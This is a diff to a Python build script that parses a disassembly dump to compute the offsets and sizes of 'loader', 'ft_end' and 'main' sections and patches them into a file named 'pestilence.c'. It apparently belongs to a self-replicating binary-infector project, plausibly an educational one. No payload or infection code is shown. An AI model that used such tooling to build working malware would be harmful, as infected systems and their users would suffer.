@@ -13,16 +13,19 @@ end_start = int(end_start, 16)
 end_end = end[end.find("<last_instr_of_end>:") + 21:]
 end_end = end_end[:end_end.find(":")]
 end_end = int(end_end, 16)
+#print(hex(end_start), hex(end_end))
 end_size = hex(end_end + 5 - end_start)
 
 loader = dump[dump.find("<loader>:") + 10:]
-loader = loader[:loader.find("<ft_end>:") - 19]
+loader = loader[:loader.find("<ft_end>:")]
 loader_start = loader[:loader.find(":")]
 loader_start = int(loader_start, 16)
-loader_end = loader[loader.rfind("\n"):]
+loader_end = dump[dump.find("<ft_end>:") + 10:]
 loader_end = loader_end[:loader_end.find(":")]
 loader_end = int(loader_end, 16)
-loader_size = hex(loader_end - loader_start + 5)
+#print(hex(loader_start), hex(loader_end))
+#exit()
+loader_size = hex(loader_end - loader_start)
 
 main_start = dump[dump.find("<main>:") + 8:-1]
 main_start = main_start[0:main_start.find(":")].strip()
@@ -184,6 +187,7 @@ f = open("srcs_c/pestilence.c", "r")
 content = f.readlines()
 f.close()
 f = open("srcs_c/pestilence.c", "w")
+
 
 for i in range(0, len(content)):
     if content[i].find("//REPLACE1") != -1:
